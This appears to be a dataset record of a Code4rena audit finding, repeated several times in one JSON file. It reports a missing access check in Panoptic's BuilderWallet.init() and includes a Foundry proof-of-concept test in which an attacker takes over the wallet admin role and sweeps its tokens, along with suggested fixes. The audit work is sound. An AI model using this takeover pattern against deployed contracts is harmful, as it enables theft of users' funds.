@@ -1,0 +1,130 @@
+{
+  "pairing": {
+    "match_status": "exact_submission",
+    "project": "Panoptic_ Next Core_iqcUwAhCZyD",
+    "audit_uid": "iqcUwAhCZyD",
+    "requested_submission_uid": "kZEmuA42kxM",
+    "requested_finding_uid": "CUEQdPu878N",
+    "source_kind": "pipeline_findings",
+    "source_path": "/root/sc_slicer_standalone/c4_pipeline_output/Panoptic_Next_Core_iqcUwAhCZyD/20260618_141146/findings.json",
+    "source_submission_uid": "kZEmuA42kxM",
+    "source_finding_uid": "CUEQdPu878N",
+    "original_report_path": "Panoptic_ Next Core_iqcUwAhCZyD\\high_valid_kZEmuA42kxM.json",
+    "note": "The report is the exact submission paired with this contract."
+  },
+  "submission_uid": "kZEmuA42kxM",
+  "finding_uid": "CUEQdPu878N",
+  "finding_number": "17",
+  "title": "Missing Access Control in BuilderWallet.init() Function",
+  "severity": "high",
+  "validity": "valid",
+  "quality": "sufficient",
+  "user_handle": "cheng9061",
+  "body": "## Finding description and impact\n\nThe `BuilderWallet.sol` contract contains a critical access control vulnerability in the `init()` function that allows any address to overwrite the `builderAdmin` at any time. The core issue is that the `init()` function lacks any permission checks, making it publicly callable by anyone.\n\nAccording to the contract design, `BuilderWallet` is deployed by `BuilderFactory` to manage fee distribution for builders. The `init()` function is intended to set the `builderAdmin` address, which has exclusive permission to call `sweep()` and withdraw tokens from the wallet. However, the implementation allows any address to call `init()` and overwrite the legitimate `builderAdmin`.\n\n**Vulnerable implementation:**\n```solidity\n// Inside BuilderWallet contract\nfunction init(address _builderAdmin) external {\n    builderAdmin = _builderAdmin;  // No access control check\n}\n```\n\n**Impact on sweep() function:**\n```solidity\nfunction sweep(address token, address to) external {\n    if (msg.sender != builderAdmin) revert Errors.NotBuilder();\n    // ... transfer logic\n}\n```\n\nThe vulnerability could lead to:\n- Direct theft of builder fees by attackers\n- Loss of funds for legitimate builders\n\n\n## Recommended mitigation steps\n\n**Add access control to the `init()` function in `BuilderWallet.sol`**:\n\nThere are several approaches to fix this vulnerability:\n\n**Option 1: Restrict `init()` to Factory only (Recommended)**\n```solidity\nfunction init(address _builderAdmin) external {\n    if (msg.sender != FACTORY) revert Errors.NotFactory();\n    if (builderAdmin != address(0)) revert Errors.AlreadyInitialized();\n    builderAdmin = _builderAdmin;\n}\n```\n\n**Option 2: Make `init()` callable only once**\n```solidity\nbool private initialized;\n\nfunction init(address _builderAdmin) external {\n    if (initialized) revert Errors.AlreadyInitialized();\n    if (msg.sender != FACTORY) revert Errors.NotFactory();\n    builderAdmin = _builderAdmin;\n    initialized = true;\n}\n```",
+  "proof_of_concept": "```solidity\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.24;\n\nimport \"forge-std/Test.sol\";\nimport {BuilderWallet, BuilderFactory} from \"@contracts/RiskEngine.sol\";\nimport {Errors} from \"@libraries/Errors.sol\";\nimport {ERC20S} from \"./testUtils/ERC20S.sol\";\n\n/**\n * @title H-1: BuilderWallet.init() Missing Access Control Vulnerability Test\n * @notice Verifies that an attacker can call init() at any time to overwrite builderAdmin and steal fees\n */\ncontract H1Test is Test {\n    BuilderFactory factory;\n    ERC20S token;\n    \n    address owner = address(0x1);\n    address legitimateBuilder = address(0x2);\n    address attacker = address(0x3);\n    \n    uint48 builderCode = 12345;\n    address wallet;\n    \n    function setUp() public {\n        vm.prank(owner);\n        factory = new BuilderFactory(owner);\n        \n        token = new ERC20S(\"Test Token\", \"TEST\", 18);\n        token.mint(address(this), 1000e18);\n    }\n    \n    /**\n     * @notice Test vulnerability: Attacker can call init() at any time to overwrite legitimate builderAdmin\n     */\n    function test_AttackerCanHijackBuilderWallet() public {\n        // Step 1: Owner deploys BuilderWallet through Factory (normal flow)\n        vm.prank(owner);\n        wallet = factory.deployBuilder(builderCode, legitimateBuilder);\n        \n        // Verify legitimate builderAdmin is set\n        assertEq(BuilderWallet(wallet).builderAdmin(), legitimateBuilder);\n        \n        // Step 2: Send fees to BuilderWallet (simulating protocol-allocated fees)\n        token.transfer(wallet, 100e18);\n        assertEq(token.balanceOf(wallet), 100e18);\n        \n        // Step 3: Attacker can call init() at any time to overwrite builderAdmin\n        vm.prank(attacker);\n        BuilderWallet(wallet).init(attacker);\n        \n        // Verify builderAdmin has been overwritten by attacker\n        assertEq(BuilderWallet(wallet).builderAdmin(), attacker);\n        assertNotEq(BuilderWallet(wallet).builderAdmin(), legitimateBuilder);\n        \n        // Step 4: Attacker immediately withdraws funds\n        vm.prank(attacker);\n        BuilderWallet(wallet).sweep(address(token), attacker);\n        \n        // Verify attacker successfully withdrew funds\n        assertEq(token.balanceOf(attacker), 100e18);\n        assertEq(token.balanceOf(wallet), 0);\n        \n        // Step 5: Legitimate builderAdmin cannot withdraw funds (overwritten)\n        vm.prank(legitimateBuilder);\n        vm.expectRevert(Errors.NotBuilder.selector);\n        BuilderWallet(wallet).sweep(address(token), legitimateBuilder);\n    }\n    \n}\n\n```",
+  "lines_of_code": [
+    "https://github.com/code-423n4/2025-12-panoptic/blob/4ef958cbe0a136fac56138f55a64706d1db037de/contracts/RiskEngine.sol#L2315-L2317",
+    "https://github.com/code-423n4/2025-12-panoptic/blob/4ef958cbe0a136fac56138f55a64706d1db037de/contracts/RiskEngine.sol#L2320-L2325"
+  ],
+  "source_record": {
+    "project_id": "iqcUwAhCZyD",
+    "submission_index": "132",
+    "api_submission_id": "",
+    "uid": "kZEmuA42kxM",
+    "number": "132",
+    "title": "Missing Access Control in BuilderWallet.init() Function",
+    "severity": "high",
+    "validity": "valid",
+    "quality": "sufficient",
+    "handle": "cheng9061",
+    "lines_of_code": [
+      "https://github.com/code-423n4/2025-12-panoptic/blob/4ef958cbe0a136fac56138f55a64706d1db037de/contracts/RiskEngine.sol#L2315-L2317",
+      "https://github.com/code-423n4/2025-12-panoptic/blob/4ef958cbe0a136fac56138f55a64706d1db037de/contracts/RiskEngine.sol#L2320-L2325"
+    ],
+    "body": "## Finding description and impact\n\nThe `BuilderWallet.sol` contract contains a critical access control vulnerability in the `init()` function that allows any address to overwrite the `builderAdmin` at any time. The core issue is that the `init()` function lacks any permission checks, making it publicly callable by anyone.\n\nAccording to the contract design, `BuilderWallet` is deployed by `BuilderFactory` to manage fee distribution for builders. The `init()` function is intended to set the `builderAdmin` address, which has exclusive permission to call `sweep()` and withdraw tokens from the wallet. However, the implementation allows any address to call `init()` and overwrite the legitimate `builderAdmin`.\n\n**Vulnerable implementation:**\n```solidity\n// Inside BuilderWallet contract\nfunction init(address _builderAdmin) external {\n    builderAdmin = _builderAdmin;  // No access control check\n}\n```\n\n**Impact on sweep() function:**\n```solidity\nfunction sweep(address token, address to) external {\n    if (msg.sender != builderAdmin) revert Errors.NotBuilder();\n    // ... transfer logic\n}\n```\n\nThe vulnerability could lead to:\n- Direct theft of builder fees by attackers\n- Loss of funds for legitimate builders\n\n\n## Recommended mitigation steps\n\n**Add access control to the `init()` function in `BuilderWallet.sol`**:\n\nThere are several approaches to fix this vulnerability:\n\n**Option 1: Restrict `init()` to Factory only (Recommended)**\n```solidity\nfunction init(address _builderAdmin) external {\n    if (msg.sender != FACTORY) revert Errors.NotFactory();\n    if (builderAdmin != address(0)) revert Errors.AlreadyInitialized();\n    builderAdmin = _builderAdmin;\n}\n```\n\n**Option 2: Make `init()` callable only once**\n```solidity\nbool private initialized;\n\nfunction init(address _builderAdmin) external {\n    if (initialized) revert Errors.AlreadyInitialized();\n    if (msg.sender != FACTORY) revert Errors.NotFactory();\n    builderAdmin = _builderAdmin;\n    initialized = true;\n}\n```",
+    "proof_of_concept": "```solidity\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.24;\n\nimport \"forge-std/Test.sol\";\nimport {BuilderWallet, BuilderFactory} from \"@contracts/RiskEngine.sol\";\nimport {Errors} from \"@libraries/Errors.sol\";\nimport {ERC20S} from \"./testUtils/ERC20S.sol\";\n\n/**\n * @title H-1: BuilderWallet.init() Missing Access Control Vulnerability Test\n * @notice Verifies that an attacker can call init() at any time to overwrite builderAdmin and steal fees\n */\ncontract H1Test is Test {\n    BuilderFactory factory;\n    ERC20S token;\n    \n    address owner = address(0x1);\n    address legitimateBuilder = address(0x2);\n    address attacker = address(0x3);\n    \n    uint48 builderCode = 12345;\n    address wallet;\n    \n    function setUp() public {\n        vm.prank(owner);\n        factory = new BuilderFactory(owner);\n        \n        token = new ERC20S(\"Test Token\", \"TEST\", 18);\n        token.mint(address(this), 1000e18);\n    }\n    \n    /**\n     * @notice Test vulnerability: Attacker can call init() at any time to overwrite legitimate builderAdmin\n     */\n    function test_AttackerCanHijackBuilderWallet() public {\n        // Step 1: Owner deploys BuilderWallet through Factory (normal flow)\n        vm.prank(owner);\n        wallet = factory.deployBuilder(builderCode, legitimateBuilder);\n        \n        // Verify legitimate builderAdmin is set\n        assertEq(BuilderWallet(wallet).builderAdmin(), legitimateBuilder);\n        \n        // Step 2: Send fees to BuilderWallet (simulating protocol-allocated fees)\n        token.transfer(wallet, 100e18);\n        assertEq(token.balanceOf(wallet), 100e18);\n        \n        // Step 3: Attacker can call init() at any time to overwrite builderAdmin\n        vm.prank(attacker);\n        BuilderWallet(wallet).init(attacker);\n        \n        // Verify builderAdmin has been overwritten by attacker\n        assertEq(BuilderWallet(wallet).builderAdmin(), attacker);\n        assertNotEq(BuilderWallet(wallet).builderAdmin(), legitimateBuilder);\n        \n        // Step 4: Attacker immediately withdraws funds\n        vm.prank(attacker);\n        BuilderWallet(wallet).sweep(address(token), attacker);\n        \n        // Verify attacker successfully withdrew funds\n        assertEq(token.balanceOf(attacker), 100e18);\n        assertEq(token.balanceOf(wallet), 0);\n        \n        // Step 5: Legitimate builderAdmin cannot withdraw funds (overwritten)\n        vm.prank(legitimateBuilder);\n        vm.expectRevert(Errors.NotBuilder.selector);\n        BuilderWallet(wallet).sweep(address(token), legitimateBuilder);\n    }\n    \n}\n\n```",
+    "detail_url": "https://code4rena.com/api/v1/audits/iqcUwAhCZyD/submissions/132",
+    "raw": {
+      "auditUid": "iqcUwAhCZyD",
+      "createdAt": "2025-12-22T06:13:35.138Z",
+      "deletedAt": null,
+      "evaluations": [
+        {
+          "uid": "rpamomAvbxk",
+          "userUid": "q9yEBhoN6NN",
+          "userAuditRole": "judge",
+          "createdAt": "2025-12-22T01:54:22.652Z",
+          "type": "validity",
+          "value": "valid",
+          "submissionUid": null,
+          "findingUid": "CUEQdPu878N"
+        },
+        {
+          "uid": "xiPD4UyJBq5",
+          "userUid": "q9yEBhoN6NN",
+          "userAuditRole": "judge",
+          "createdAt": "2025-12-22T01:54:31.581Z",
+          "type": "severity",
+          "value": "high",
+          "submissionUid": null,
+          "findingUid": "CUEQdPu878N"
+        },
+        {
+          "uid": "qb5mHQ7arSv",
+          "userUid": "q9yEBhoN6NN",
+          "userAuditRole": "judge",
+          "createdAt": "2025-12-23T05:34:48.936Z",
+          "type": "quality",
+          "value": "sufficient",
+          "submissionUid": "kZEmuA42kxM",
+          "findingUid": null
+        },
+        {
+          "uid": "R8PMSxXrW5V",
+          "userUid": "drB5cYgMy5X",
+          "userAuditRole": "sponsor",
+          "createdAt": "2026-01-09T21:00:18.833Z",
+          "type": "validity",
+          "value": "fixed",
+          "submissionUid": null,
+          "findingUid": "CUEQdPu878N"
+        }
+      ],
+      "finding": {
+        "uid": "CUEQdPu878N",
+        "number": 17,
+        "duplicates": 84
+      },
+      "isPrimary": false,
+      "latestEvaluations": {
+        "credit": null,
+        "mitigationStatus": null,
+        "quality": "sufficient",
+        "rank": null,
+        "severity": "high",
+        "validity": "valid",
+        "updatedAt": "2026-01-20T07:47:30.899Z"
+      },
+      "mitigationOf": null,
+      "mitigationStatus": null,
+      "severity": "high",
+      "team": null,
+      "title": "Missing Access Control in BuilderWallet.init() Function",
+      "uid": "kZEmuA42kxM",
+      "updatedAt": "2025-12-22T06:13:35.138Z",
+      "user": {
+        "uid": "zkQFRuVztfV",
+        "handle": "cheng9061"
+      },
+      "sensitivity": "non-sensitive",
+      "aiSeverity": null,
+      "aiValidity": null,
+      "body": "## Finding description and impact\n\nThe `BuilderWallet.sol` contract contains a critical access control vulnerability in the `init()` function that allows any address to overwrite the `builderAdmin` at any time. The core issue is that the `init()` function lacks any permission checks, making it publicly callable by anyone.\n\nAccording to the contract design, `BuilderWallet` is deployed by `BuilderFactory` to manage fee distribution for builders. The `init()` function is intended to set the `builderAdmin` address, which has exclusive permission to call `sweep()` and withdraw tokens from the wallet. However, the implementation allows any address to call `init()` and overwrite the legitimate `builderAdmin`.\n\n**Vulnerable implementation:**\n```solidity\n// Inside BuilderWallet contract\nfunction init(address _builderAdmin) external {\n    builderAdmin = _builderAdmin;  // No access control check\n}\n```\n\n**Impact on sweep() function:**\n```solidity\nfunction sweep(address token, address to) external {\n    if (msg.sender != builderAdmin) revert Errors.NotBuilder();\n    // ... transfer logic\n}\n```\n\nThe vulnerability could lead to:\n- Direct theft of builder fees by attackers\n- Loss of funds for legitimate builders\n\n\n## Recommended mitigation steps\n\n**Add access control to the `init()` function in `BuilderWallet.sol`**:\n\nThere are several approaches to fix this vulnerability:\n\n**Option 1: Restrict `init()` to Factory only (Recommended)**\n```solidity\nfunction init(address _builderAdmin) external {\n    if (msg.sender != FACTORY) revert Errors.NotFactory();\n    if (builderAdmin != address(0)) revert Errors.AlreadyInitialized();\n    builderAdmin = _builderAdmin;\n}\n```\n\n**Option 2: Make `init()` callable only once**\n```solidity\nbool private initialized;\n\nfunction init(address _builderAdmin) external {\n    if (initialized) revert Errors.AlreadyInitialized();\n    if (msg.sender != FACTORY) revert Errors.NotFactory();\n    builderAdmin = _builderAdmin;\n    initialized = true;\n}\n```",
+      "proofOfConcept": "```solidity\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.24;\n\nimport \"forge-std/Test.sol\";\nimport {BuilderWallet, BuilderFactory} from \"@contracts/RiskEngine.sol\";\nimport {Errors} from \"@libraries/Errors.sol\";\nimport {ERC20S} from \"./testUtils/ERC20S.sol\";\n\n/**\n * @title H-1: BuilderWallet.init() Missing Access Control Vulnerability Test\n * @notice Verifies that an attacker can call init() at any time to overwrite builderAdmin and steal fees\n */\ncontract H1Test is Test {\n    BuilderFactory factory;\n    ERC20S token;\n    \n    address owner = address(0x1);\n    address legitimateBuilder = address(0x2);\n    address attacker = address(0x3);\n    \n    uint48 builderCode = 12345;\n    address wallet;\n    \n    function setUp() public {\n        vm.prank(owner);\n        factory = new BuilderFactory(owner);\n        \n        token = new ERC20S(\"Test Token\", \"TEST\", 18);\n        token.mint(address(this), 1000e18);\n    }\n    \n    /**\n     * @notice Test vulnerability: Attacker can call init() at any time to overwrite legitimate builderAdmin\n     */\n    function test_AttackerCanHijackBuilderWallet() public {\n        // Step 1: Owner deploys BuilderWallet through Factory (normal flow)\n        vm.prank(owner);\n        wallet = factory.deployBuilder(builderCode, legitimateBuilder);\n        \n        // Verify legitimate builderAdmin is set\n        assertEq(BuilderWallet(wallet).builderAdmin(), legitimateBuilder);\n        \n        // Step 2: Send fees to BuilderWallet (simulating protocol-allocated fees)\n        token.transfer(wallet, 100e18);\n        assertEq(token.balanceOf(wallet), 100e18);\n        \n        // Step 3: Attacker can call init() at any time to overwrite builderAdmin\n        vm.prank(attacker);\n        BuilderWallet(wallet).init(attacker);\n        \n        // Verify builderAdmin has been overwritten by attacker\n        assertEq(BuilderWallet(wallet).builderAdmin(), attacker);\n        assertNotEq(BuilderWallet(wallet).builderAdmin(), legitimateBuilder);\n        \n        // Step 4: Attacker immediately withdraws funds\n        vm.prank(attacker);\n        BuilderWallet(wallet).sweep(address(token), attacker);\n        \n        // Verify attacker successfully withdrew funds\n        assertEq(token.balanceOf(attacker), 100e18);\n        assertEq(token.balanceOf(wallet), 0);\n        \n        // Step 5: Legitimate builderAdmin cannot withdraw funds (overwritten)\n        vm.prank(legitimateBuilder);\n        vm.expectRevert(Errors.NotBuilder.selector);\n        BuilderWallet(wallet).sweep(address(token), legitimateBuilder);\n    }\n    \n}\n\n```",
+      "linesOfCode": "https://github.com/code-423n4/2025-12-panoptic/blob/4ef958cbe0a136fac56138f55a64706d1db037de/contracts/RiskEngine.sol#L2315-L2317,https://github.com/code-423n4/2025-12-panoptic/blob/4ef958cbe0a136fac56138f55a64706d1db037de/contracts/RiskEngine.sol#L2320-L2325",
+      "number": 132,
+      "aiExplanation": null,
+      "_index": 132
+    }
+  }
+}
